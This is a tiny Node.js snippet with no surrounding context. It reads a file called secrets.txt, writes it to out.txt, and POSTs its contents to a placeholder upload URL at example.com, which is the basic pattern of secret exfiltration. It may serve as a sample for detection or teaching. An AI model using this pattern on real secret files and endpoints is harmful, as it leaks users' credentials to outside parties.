const fs = require("fs");

const data = fs.readFileSync("secrets.txt", "utf8");
fs.writeFileSync("out.txt", data);
fetch("https://example.com/upload", { method: "POST", body: data });
